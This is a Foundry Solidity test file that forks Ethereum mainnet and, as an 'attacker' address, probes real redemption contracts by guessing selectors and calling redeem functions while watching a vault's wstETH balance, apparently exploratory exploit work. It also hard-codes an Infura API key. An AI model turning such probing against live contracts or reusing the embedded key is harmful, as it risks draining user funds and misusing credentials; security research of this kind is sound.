// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract DecodeLargeNumbers is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_DecodeLargeReturns() public view {
        console.log("=== DECODING LARGE RETURN VALUES ===\n");

        // 0x252c50f3 returned 2636939771226449803047
        uint256 val1 = 2636939771226449803047;
        console.log("0x252c50f3 return:", val1);
        console.log("  As token amount (18 dec):", val1 / 1e18);
        console.log("  Hex:");
        console.logBytes32(bytes32(val1));

        // 0x411557d1 returned large number - try as address
        // Actually let me get the actual raw bytes
        (bool s1, bytes memory d1) = REDEMPTION_1.staticcall(
            abi.encodeWithSelector(bytes4(0x252c50f3))
        );
        if (s1) {
            console.log("\n0x252c50f3 raw return:");
            console.logBytes(d1);
            if (d1.length >= 32) {
                bytes32 raw = abi.decode(d1, (bytes32));
                console.log("  As bytes32:");
                console.logBytes32(raw);
                console.log("  As address:", address(uint160(uint256(raw))));
            }
        }

        (bool s2, bytes memory d2) = REDEMPTION_1.staticcall(
            abi.encodeWithSelector(bytes4(0x411557d1))
        );
        if (s2) {
            console.log("\n0x411557d1 raw return:");
            console.logBytes(d2);
            if (d2.length >= 32) {
                bytes32 raw = abi.decode(d2, (bytes32));
                console.log("  As bytes32:");
                console.logBytes32(raw);
                console.log("  As address:", address(uint160(uint256(raw))));
            }
        }

        (bool s3, bytes memory d3) = REDEMPTION_1.staticcall(
            abi.encodeWithSelector(bytes4(0x06e29712))
        );
        if (s3) {
            console.log("\n0x06e29712 raw return:");
            console.logBytes(d3);
            if (d3.length >= 32) {
                bytes32 raw = abi.decode(d3, (bytes32));
                console.log("  As bytes32:");
                console.logBytes32(raw);
                console.log("  As address:", address(uint160(uint256(raw))));
            }
        }
    }

    function test_AnalyzeError0xfb8f41b2() public view {
        console.log("=== ANALYZING ERROR 0xfb8f41b2 ===\n");

        // Try more error signatures
        string[30] memory errors = [
            "BelowMinRedemption()",
            "BelowMinAmount()",
            "AmountTooLow()",
            "InsufficientAmount()",
            "TooSmall()",
            "MinAmountNotReached()",
            "BelowMinimumRedemption()",
            "RedemptionTooSmall()",
            "AmountBelowMin()",
            "BelowMin()",
            "Redemption__BelowMin()",
            "Redemption__TooSmall()",
            "Redemption__AmountTooLow()",
            "MinNotMet()",
            "MinRedemptionNotMet()",
            "MinAmountNotMet()",
            "UnderMinimum()",
            "LessThanMinimum()",
            "AmountUnderMin()",
            "RedemptionUnderMin()",
            "TooLow()",
            "ValueTooLow()",
            "InsufficientValue()",
            "NotEnoughAmount()",
            "AmountNotSufficient()",
            "RedemptionNotSufficient()",
            "BelowThreshold()",
            "UnderThreshold()",
            "ThresholdNotMet()",
            "MinThresholdNotMet()"
        ];

        bytes4 target = bytes4(0xfb8f41b2);
        console.log("Looking for 0xfb8f41b2:\n");

        for (uint i = 0; i < errors.length; i++) {
            bytes4 sel = bytes4(keccak256(bytes(errors[i])));
            if (sel == target) {
                console.log("*** MATCH:", errors[i]);
            }
        }
    }

    function test_TryMinRedeemAmount() public {
        console.log("=== TRYING MINIMUM REDEEM AMOUNT ===\n");

        // minRedeemInUnderlying returned 0, but maybe there's a different check
        // Let's try with larger amounts

        vm.startPrank(attacker);
        deal(IAU, attacker, 1000000e18);
        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);
        IERC20(IAU).approve(REDEMPTION_1, type(uint256).max);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        // Try different amounts
        uint256[] memory amounts = new uint256[](6);
        amounts[0] = 100e18;
        amounts[1] = 1000e18;
        amounts[2] = 5000e18;
        amounts[3] = 10000e18;
        amounts[4] = 50000e18;
        amounts[5] = 100000e18;

        console.log("Testing R0 redeem(uint96):");
        for (uint i = 0; i < amounts.length; i++) {
            (bool s, bytes memory d) = REDEMPTION_0.call(
                abi.encodeWithSignature("redeem(uint96)", uint96(amounts[i]))
            );
            console.log("Amount", amounts[i] / 1e18, ":", s);
            if (!s && d.length >= 4) {
                bytes4 err = bytes4(d);
                if (err != bytes4(0xfb8f41b2)) {
                    console.log("  Different error:");
                    console.logBytes4(err);
                }
            }
            if (s) {
                console.log("  *** SUCCESS! ***");
                break;
            }
        }

        // Check if user needs to have a proxy first
        console.log("\nChecking if proxy exists for attacker:");
        (bool s1, bytes memory d1) = REDEMPTION_1.staticcall(
            abi.encodeWithSelector(bytes4(0x778d364f), attacker) // possible proxy getter
        );
        if (s1 && d1.length >= 32) {
            address proxy = abi.decode(d1, (address));
            console.log("Proxy for attacker:", proxy);
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker));
    }

    function test_InvestigateRedemptionFlow() public {
        console.log("=== INVESTIGATING REDEMPTION FLOW ===\n");

        // The hint: "extracting assets to a proxy attacker owns, then extracting from that proxy"
        // This suggests:
        // 1. Assets go to a proxy
        // 2. Attacker can extract from proxy

        vm.startPrank(attacker);
        deal(IAU, attacker, 1000000e18);
        deal(wstETH, attacker, 1000e18); // Give some wstETH too
        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);
        IERC20(IAU).approve(REDEMPTION_1, type(uint256).max);
        IERC20(wstETH).approve(REDEMPTION_0, type(uint256).max);
        IERC20(wstETH).approve(REDEMPTION_1, type(uint256).max);

        // Try to create a proxy or initiate redemption
        console.log("Trying various redemption functions:");

        // Try R1 functions
        bytes4[] memory sels = new bytes4[](10);
        sels[0] = bytes4(keccak256("requestRedeem(uint256)"));
        sels[1] = bytes4(keccak256("initiateRedeem(uint256)"));
        sels[2] = bytes4(keccak256("startRedeem(uint256)"));
        sels[3] = bytes4(keccak256("beginRedeem(uint256)"));
        sels[4] = bytes4(keccak256("createRedemption(uint256)"));
        sels[5] = bytes4(keccak256("queueRedeem(uint256)"));
        sels[6] = bytes4(keccak256("submitRedeem(uint256)"));
        sels[7] = bytes4(keccak256("enterRedeem(uint256)"));
        sels[8] = bytes4(keccak256("depositRedeem(uint256)"));
        sels[9] = bytes4(keccak256("initRedeem(uint256)"));

        for (uint i = 0; i < sels.length; i++) {
            (bool s, bytes memory d) = REDEMPTION_1.call(
                abi.encodeWithSelector(sels[i], 1000e18)
            );
            if (s) {
                console.log("SUCCESS:");
                console.logBytes4(sels[i]);
            }
        }

        vm.stopPrank();
    }
}
